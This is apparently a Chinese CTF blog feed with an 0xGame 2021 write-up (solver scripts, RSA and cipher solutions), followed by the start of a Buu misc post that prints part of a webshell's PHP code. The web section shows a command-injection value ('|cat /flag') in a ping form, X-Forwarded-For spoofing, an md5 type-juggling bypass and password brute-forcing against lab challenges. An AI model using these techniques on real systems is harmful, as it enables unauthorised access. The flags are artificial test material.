arr[::-1]for i in range(0,len(arr) - 3):    print(chr(arr[i] ^ arr[i + 3]), end &#x3D; &quot;&quot;)# 0xGame&#123;Th3_10ng_w4y_w3_901ng_fr33&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Random-Chaos"><a href="#Random-Chaos" class="headerlink" title="Random Chaos"></a>Random Chaos</h3><p>C语言 <code>rand</code> 函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;unsigned char enc[41] &#x3D; &#123;0x22, 0xca, 0x7, 0x19, 0xf8, 0xfb, 0x28, 0x9d, 0x1e, 0x80, 0xac, 0xc9, 0x60, 0x46, 0x18, 0x21, 0xdf, 0x95, 0xd5, 0x70, 0xc5, 0x19, 0xea, 0xb0, 0x9c, 0x83, 0x11, 0x4a, 0x93, 0xc7, 0x91, 0xf6, 0x14, 0x71, 0x2f, 0x22, 0x14, 0xbf, 0x58, 0x76&#125;; int main()&#123;    srand(0x2021);    for (int i &#x3D; 0; i &lt; 40; ++i)    &#123;        printf(&quot;%c&quot;,(enc[i] ^ (rand() &amp; 0xff)));    &#125;    return 0;&#125;&#x2F;&#x2F; 0xGame&#123;d6ca93397ecb4d4e83792a7100737932&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Neverland"><a href="#Neverland" class="headerlink" title="Neverland"></a>Neverland</h3><p>递归深度比较小的时候，递归求解还能出结果</p><p>当递归深度非常大时候，时间不够求解出结果，所以flag只能输出一半</p><p>可以看一下文章按照优化斐波那契数列的方法优化一下func函数(<em>比如将递归转换为一个循环函数进行计算，虽然也慢，但与递归相比是非常的快了</em>)，就能输出正确结果</p><p><a href="https://blog.csdn.net/qq_41035588/article/details/81814547," title="斐波那契数列优化">【C语言】斐波那契数列四种优化求解</a></p><p><strong>当然不看以上方法也可以</strong>，我们知道 <code>int</code> 型数据储存数据有范围限制，而且可以知道这个数列在不断增大，所以 <code>func</code> 函数每次返回的数据，相当于数列中对应数据的值对 0x10000000 取模</p><p>斐波那契数列对某一个数取模会出现循环节，这个数列也同样如此，我们将<code>func</code>函数写一遍，按顺序输出一些数就可以发现规律了</p><p>测试代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def func(n):    if (n &#x3D;&#x3D; 0):        return 7    if (n &#x3D;&#x3D; 1):        return 8    return (3 * func(n-1) + 4 * func(n-2)) &amp; 0xfffffffffor i in range(1,50):    print(i,&quot;:&quot;,func(i))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">0 : 71 : 82 : 523 : 1884 : 7725 : 30686 : 122927 : 491488 : 1966129 : 78642810 : 314573211 : 1258290812 : 5033165213 : 20132658814 : 80530637215 : 322122546816 : 417 : 429496729218 : 419 : 429496729220 : 421 : 429496729222 : 423 : 429496729224 : 425 : 429496729226 : 427 : 429496729228 : 429 : 429496729230 : 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很容易就发现循环节了把，所以接下来就是直接异或操作就行，代码比较简单，这里就不写了</p><p>甚至我们可以求出这个数列的通项公式，也很容易得到这个数列的每一个数据对应的值，下面给出一个知乎链接讲述形如斐波那契数列的数列如何求通项公式</p><p><a href="https://www.zhihu.com/question/25217301" title="斐波那契通项公式">斐波那契数列通项公式是怎样推导出来的？-知乎</a></p><p>通项公式为 <code>a(n) = 3 * 4 ** n + 4 * (-1) ** n</code></p><h3 id="Roundabout"><a href="#Roundabout" class="headerlink" title="Roundabout"></a>Roundabout</h3><p>脱壳后，简单的利用 key 来循环异或，代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [68, 16, 46, 18, 50, 12, 8, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18]h &#x3D; &quot;this_is_not_flag\x00&quot;flag &#x3D; &quot;&quot;for i in range(0, 42):    flag +&#x3D; chr(ord(h[i % 16]) ^ arr[i])print(flag)# 0xGame&#123;b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Zero-Three"><a href="#Zero-Three" class="headerlink" title="Zero Three"></a>Zero Three</h3><p>z3 使用一下，就能解出flag</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from z3 import *import libnump &#x3D; [Int(&#39;x%d&#39;%i) for i in range(0,32)]num &#x3D; [Int(&#39;u%d&#39;%i) for i in range(0,8)]s &#x3D; Solver()for i in range(0,32):    s.add(p[i] &gt; 0x20)    s.add(p[i] &lt; 127)s.add(2 * p[5] + 8225 - p[0] - 9 * p[3] - p[4] - p[9] + p[10] - 6 * p[11] - p[13] - 3 * p[14] - 5 * p[15] &#x3D;&#x3D; 5643)s.add(3 * p[14] + 8 * p[10] -3  * p[2] - 6 * p[0] + 8225 - p[1] - 2 * p[5] + 3 * p[8] - 8 * p[11] + 4 * p[12] - 6 * p[15] &#x3D;&#x3D; 6620)s.add(-5 * p[12] - 7 * p[6] - 3 * p[1] + 8225 - 2 * p[0] - p[2] - 5 * p[3] - 7 * p[4] - 6 * p[5] - 2 * p[8] + 6 * p[13] &#x3D;&#x3D; 5538)s.add(2 * p[5] + 2 * p[1] + 8225 - 2 * p[0] - 2 * p[3] + 3 * p[4] - 2 * p[8] - p[10] - p[12] - 2 * p[14] - 2 * p[15] &#x3D;&#x3D; 7693)s.add(-6 * p[14] + 8225 - 2 * p[1] - 2 * p[2] - 9 * p[3] + 2 * p[4] - 5 * p[7] + 2 * p[8] - 9 * p[9] - 4 * p[10] - 6 * p[15] &#x3D;&#x3D; 4735)s.add(9 * p[14] - 7 * p[10] + 8 * p[9] + 5 * p[0] + 8225 - p[2] + p[5] - 5 * p[6] - 8 * p[11] - p[12] - 9 * p[15] &#x3D;&#x3D; 7060)s.add(p[13] - 5 * p[7] - 3 * p[2] - 3 * p[0] + 8225 - 4 * p[1] - 4 * p[4] - p[6] + 9 * p[10] - 2 * p[14] - 6 * p[15] &#x3D;&#x3D; 5864)s.add(-9 * p[14] - 3 * p[10] + 9 * p[1] - 6 * p[0] + 8225 - 5 * p[3] - 4 * p[7] - 2 * p[11] - 2 * p[12] + p[13] + 9 * p[15] &#x3D;&#x3D; 7393)s.add(6 * p[9] - 5 * p[8] - 3 * p[6] + 9 * p[2] + 8225 - p[4] + 3 * p[5] - 7 * p[7] + 7 * p[10] - 2 * p[13] - p[14] &#x3D;&#x3D; 8442)s.add(8 * p[6] - 7 * p[2] + 8225 - 8 * p[1] - p[3] + 6 * p[4] - p[7] + 5 * p[8] - 4 * p[10] - p[14] + 7 * p[15] &#x3D;&#x3D; 8376)for i in range(0,32,4):    s.add(num[i&#x2F;&#x2F;4] &#x3D;&#x3D; (p[i] + (p[i+1] * 256) + (p[i+2] * 65536) + (p[i+3] * 16777216)))s.add(-22827 * num[4] + 21984 * num[1] - 38534 * num[5] - 32344 * num[0] &#x3D;&#x3D; -98460819657603)s.add(-38215 * num[2] - 37324 * num[4] - 8436 * num[5] + 15405 * num[0] &#x3D;&#x3D; -131665436206262)s.add(10926 * num[7] - 28942 * num[1] - 34572 * num[3] - 10538 * num[5] &#x3D;&#x3D; -121891239772992)s.add(-30117 * num[6] - 22990 * num[2] - 20471 * num[5] + 34494 * num[7] &#x3D;&#x3D; -57089882568260)s.add(-33112 * num[5] - 19335 * num[4] + 34348 * num[1] + 31445 * num[2] &#x3D;&#x3D; 56335531538050)s.add(-13566 * num[5] + 14758 * num[0] - 19814 * num[2] - 26447 * num[4] &#x3D;&#x3D; -81105980248303)s.add(25898 * num[5] - 15817 * num[1] + 20463 * num[7] - 33578 * num[0] &#x3D;&#x3D; -28860618440412)s.add(-35429 * num[7] + 36594 * num[2] - 28801 * num[6] - 14952 * num[3] &#x3D;&#x3D; -45384029412201)print(s.check())if s.check() &#x3D;&#x3D; sat:    flag &#x3D; b&quot;&quot;    result &#x3D; s.model()    for i in range(0,8):        print(num[i], result[num[i]])    for i in range(0,8):        flag +&#x3D; libnum.n2s(result[num[i]].as_long())[::-1]    flag &#x3D; &quot;0xGame&#123;&quot; + str(flag, encoding &#x3D; &quot;utf-8&quot;) + &quot;&#125;&quot;    print(flag)# 0xGame&#123;udydYCBxUB6vqsAt5VCs6LKDRqXLUhSW&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="看看我的头"><a href="#看看我的头" class="headerlink" title="看看我的头"></a>看看我的头</h3><p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p><p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把GET请求方式改为POST，可以看到网页提示变化。再是提示要使用<code>N1k0la浏览器</code>。请求头中User-Agent向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加<code>N1k0la</code>。页面又发生变化，提示要本地登陆，所以我们添加X-Forwarded-For头去伪造我们的来源ip为本地ip：127.0.0.1 </p><p>然后会得到一串base64编码的数据解码后是</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame2021'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Pupi1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'welcome to the0xGame2021'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里是一个php的弱类型，md5碰撞，有多种方式去做</p><ol><li>md5()返回32位字符串，若均为<strong>0e</strong>开头可被认为是科学计数法表示的数字<strong>0</strong></li><li>md5()处理不了数组，会报错并返回NULL值。所以2个变量的md5值会相同</li><li>因为这里没有对是否传入变量进行判断，所以不传入md5处理的那2个变量，md5() 会直接输出<code>d41d8cd98f00b204e9800998ecf8427e</code> 代表空。</li><li>当然也可以直接传入2个一样的值 :-)</li></ol><h3 id="看看你能登陆吗"><a href="#看看你能登陆吗" class="headerlink" title="看看你能登陆吗"></a>看看你能登陆吗</h3><p>这个题主要是为了让新生熟悉burpsuit的操作，了解web渗透的本质是信息搜集。</p><p>题目说了登陆的关键词，自然想到可能存在后台，直接试常见的后台路径，或者使用目录扫描器扫描后台路径。发现<code>/admin</code>存在访问发现后台。有提示说密码是4位纯数字，常识可知后台的用户名大部分为admin，所以我们爆破密码。这里可以使用burpsuit，或者python写脚本，只是这里密码故意设为0310（出题人的生日，嘻嘻  所以在爆破密码时要注意0开头的4个数字也是合理的。爆破登陆即可。</p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>Robots协议了解一下。</p><p>robots.txt会被放在网站根目录下，告诉爬虫哪些不能爬，哪些能爬。 直接访问</p><p><code>/robots.txt</code>得到提示4ll.html，之后直接访问<code>/4ll.html</code>F12查看网页源代码，即可得到。</p><h3 id="爱ping才会赢"><a href="#爱ping才会赢" class="headerlink" title="爱ping才会赢"></a>爱ping才会赢</h3><p>这个题主要考察linux下的命令执行。</p><p>首先发现带有Ping字样的按钮是不可点击的，F12后将对应处的disabled=”disabled”删除即可点中。</p><p>这里实现ping的功能猜测是使用了调用系统命令的函数，所以我们可以进行命令拼接。</p><p>在linux中; |等<strong>连接符</strong>可连接两个独立语句并执行</p><p><code>|ls /</code>所以我们传入这个就可以查看根目录下的文件，找到flag后直接传入<code>|cat /flag</code>即可</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-Sign-in"><a href="#Crypto-Sign-in" class="headerlink" title="Crypto Sign in"></a>Crypto Sign in</h3><p>下载附件，阅读一下入门指南，最后就有flag。</p><h3 id="CuteCaesar"><a href="#CuteCaesar" class="headerlink" title="CuteCaesar"></a>CuteCaesar</h3><p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了hint，大家也都很快找到了这个解码器。解码之后是</p><pre class="line-numbers language-none"><code class="language-none">0aJdph&#123;fdhvdu_1v_q0w_fxwh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里根据题目名字，就可以知道是凯撒加密，百度找一个凯撒密码的解密器，位移量是3，解密即可。</p><h3 id="manycode"><a href="#manycode" class="headerlink" title="manycode"></a>manycode</h3><p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索ctf常见编码，一个个比照就可以一层层解密。主要希望大家能掌握Base64、32、16这三种常见编码的形式。</p><p>首先是aaencode，找一个在线解码器即可，网上说的在控制台运行会报错，可能是js的新语法规定 “_” 不能定义变量。然后就是三层base解码，依次是base16，base32，base64。最后就可以得到flag。</p><h3 id="ezVigenere"><a href="#ezVigenere" class="headerlink" title="ezVigenère"></a>ezVigenère</h3><p>这题的做法很多，有的同学是写程序爆破key，有的同学是根据最后flag的格式0xGame，从而推断key为abc，当然也有同学找了一个网址，里面的key默认是abc，直接解密（大意了，忘改key了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h3 id="MyFunction"><a href="#MyFunction" class="headerlink" title="MyFunction"></a>MyFunction</h3><p>一个函数，这个函数是已知$y=x\ln x$,求$x$的结果。<br>这个题是模仿西电新生赛的函数题出的，那边用的是$y=e^x$，这个函数有反函数$y=\ln x$。但$y=x\ln x$没有反函数，但根据这个函数在$[1,+∞)$单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差(但实测并不需要)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> math <span class="token keyword">import</span> logs<span class="token operator">=</span><span class="token string">""</span>D<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x<span class="token operator">*</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.003</span><span class="token punctuation">:</span>            s<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;YouH4veKn0wedPy7honL081s&lt;y=ln(x)>InM47hs&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过多数人是Excel打表、或者一个一个算的。直接开脚本写的不多。</p><h3 id="Class-8"><a href="#Class-8" class="headerlink" title="Class 8"></a>Class 8</h3><p>八种古典密码（可能确实出得有点脑洞了）</p><pre class="line-numbers language-none"><code class="language-none">第1、6位是盲文第2、7位是跳舞的小人第3位是猪圈密码第4、11、16位是手机九键键盘第5、9、14位是莫尔斯电码第8、12位是银河字母第10、15位是培根密码第13位是电脑键盘，cfgb之间围着的是V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题一开始打算出规则的单词的，但后面就出得不规则了。主要是第13位、第15位出问题出得比较多。第15位确实有两种解法，因此第15位是<code>O</code>最后也算对了。</p><p>flag:<code>0xGame&#123;CLASSLNRDDLDVTNB&#125;</code>或<code>0xGame&#123;CLASSLNRDDLDVTOB&#125;</code></p><h3 id="ABC-Of-RSA"><a href="#ABC-Of-RSA" class="headerlink" title="ABC Of RSA"></a>ABC Of RSA</h3><p>这个题是后面加的。主要是给新生入门一下RSA。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">在RSA加密中，已知：p<span class="token operator">=</span><span class="token number">9677</span>q<span class="token operator">=</span><span class="token number">9241</span>e<span class="token operator">=</span><span class="token number">10009</span>求解密指数d不超过<span class="token number">4000</span>万的正值，用十进制表示，包上0xGame<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>提交。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>百度百科上就有很多关于RSA的加密方法和解密方法。如果用上Crypto包，是非常好做的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">9677</span><span class="token punctuation">,</span><span class="token number">9241</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>inverse<span class="token punctuation">(</span><span class="token number">10009</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#39982249</span><span class="token comment">#flag是0xGame&#123;39982249&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也有很多学弟学妹们用的是逆元的定义：$10009d= 1 +k \phi$做出来的，通过枚举$k$，找到了$d$的值。。不过这一方法在下一个RSA中就不太适用了，因为下一题的$k$很大，没法枚举了。</p><h3 id="BlackGiveRSA"><a href="#BlackGiveRSA" class="headerlink" title="BlackGiveRSA"></a>BlackGiveRSA</h3><p>一个RSA题目，看到$n$比较小，那么$n$的值直接放入网站/yafu/sagemath中分解就行了。<br>分解出$p=1175078221,q=1435756429$。然后对输出内容一段一段解密，再<code>long_to_bytes</code>连接起来，就是flag了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">1175078221</span><span class="token punctuation">,</span><span class="token number">1435756429</span>n<span class="token punctuation">,</span>phi<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>inverse<span class="token punctuation">(</span><span class="token number">10007</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>cipher<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token number">1150947306854980854</span><span class="token punctuation">,</span>    <span class="token number">243703926267532432</span><span class="token punctuation">,</span>    <span class="token number">1069319314811079682</span><span class="token punctuation">,</span>    <span class="token number">688582941857504686</span><span class="token punctuation">,</span>    <span class="token number">670683629344243145</span><span class="token punctuation">,</span>    <span class="token number">1195068175327355214</span>    <span class="token punctuation">]</span>m<span class="token operator">=</span><span class="token string">b""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>    m<span class="token operator">+=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;ChuTiRenDeQQShiJiShangJiuShiQDeZhi&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag解出来：“出题人的QQ实际上就是q的值。”，各位学弟学妹们可以看看自己QQ是不是素数，平均30几个QQ号就有一个是素数。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p>直接看RULES就行</p><h3 id="A-translate-draft"><a href="#A-translate-draft" class="headerlink" title="A translate draft"></a>A translate draft</h3><p>下载附件，打开提示需要输入密码，是伪加密。扔进winhex，搜索504B0102，往后看加密位置，是0900，更改为0000。打开文件，将word文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到b32加密的串，解出前半段flag。将word改为zip，打开发现HiddenBy13.txt，内容为rot13加密的后半段flag。</p><h3 id="认真的血"><a href="#认真的血" class="headerlink" title="认真的血"></a>认真的血</h3><p>NTFS文件流隐写，使用winrar解压文件，使用ntfsstreameditor扫描得到flag.txt，内容为ROT47加密，解密得flag。</p><h3 id="Kakurennbo"><a href="#Kakurennbo" class="headerlink" title="Kakurennbo"></a>Kakurennbo</h3><p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是0宽隐写。验证：在kali下使用vim打开文本，可以发现0宽字符。在线解密<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>可以得到W型栅栏加密过的flag。<a href="http://www.atoolbox.net/Tool.php?Id=777%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%A0%8F%E6%95%B021%E5%BE%97%E5%88%B0flag%E3%80%82">http://www.atoolbox.net/Tool.php?Id=777解密，栏数21得到flag。</a></p><h3 id="EzAlgorithm"><a href="#EzAlgorithm" class="headerlink" title="EzAlgorithm"></a>EzAlgorithm</h3><p>一个简单的算法题：因为第$i$级楼梯可以通过第$i-1,i-2,i-3$级楼梯到达，因此到达第$i$级楼梯的走法等于到达第$i-1$级楼梯的走法加上到达第$i-2$级楼梯的走法加上到达第$i-3$级楼梯的走法。</p><p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为$0$就行。</p><p>这边需要注意的是，由于模数$1435756429$比<code>C/C++ int</code>的最大值的一半要大，那这里需要开<code>long long</code>解决。</p><p>这是解题代码（C语言的，C++/Python也可以做。），最后是十个测试点的答案。需要注意的是有一个点有点坑，因为那个点它第一级楼梯就是坏的：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;long long f[4000000]&#x3D;&#123;0&#125;,v[4000000]&#x3D;&#123;0&#125;;int n,k;int main()&#123;FILE *fp&#x3D;fopen(&quot;testdata10.in&quot;,&quot;r&quot;);&#x2F;&#x2F;这边的数字从1到10挨个修改，运行一遍就行FILE *gp&#x3D;fopen(&quot;result.out&quot;,&quot;a&quot;);int i,j;fscanf(fp,&quot;%d%d&quot;,&amp;n,&amp;k);for(i&#x3D;1;i&lt;&#x3D;k;i++)&#123;int x;fscanf(fp,&quot;%d&quot;,&amp;x);v[x]&#x3D;1;&#125;if(!v[1]) f[1]&#x3D;1;if(!v[2]) f[2]&#x3D;f[1]+1;if(!v[3]) f[3]&#x3D;f[1]+f[2]+1;for(i&#x3D;4;i&lt;&#x3D;n;i++)&#123;if(v[i]&#x3D;&#x3D;1)f[i]&#x3D;0;elsef[i]&#x3D;(f[i-1]+f[i-2]+f[i-3])%1435756429;&#125;fprintf(gp,&quot;%lld\n&quot;,f[n]%1435756429);fclose(fp);fclose(gp);&#125;&#x2F;&#x2F;13 98 47 3359124 1205125 834118675 1289432148 1087983205 1176572515 566575482<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些数加起来模$1435756429$的值为$651977145$，所以flag为<code>0xGame&#123;651977145&#125;</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buu解题记录之misc(二)</title>
      <link href="/2021/10/09/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C/"/>
      <url>/2021/10/09/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>25</p><blockquote><p>提示：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p> 下载下来后是一个压缩包，需要密码，提示了四位数字，直接爆破</p><p><img src="https://img2020.cnblogs.com/blog/2134962/202107/2134962-20210731110116920-771837007.png" alt="img"></p><p> 解压后打开文件看到一大堆的+和&gt;，是brainfuck编码</p><p><a href="https://tool.bugku.com/brainfuck/">Brainfuck/Text/Ook! obfuscator - deobfuscator. Decode and encode online. (bugku.com)</a></p><p>得到flag</p><p>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><p>26 后门查杀</p><blockquote><p>小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。</p></blockquote><p>如题，网站被上传了Webshell，找一个杀毒软件查一下就知道，这就是科技的力量</p><p><img src="https://shierjinghuang.github.io/2021/10/09/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C/1633756513927.png"></p><p>在php文件中很容易就能找到flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//ini_set('display_errors',1);</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bot'</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token 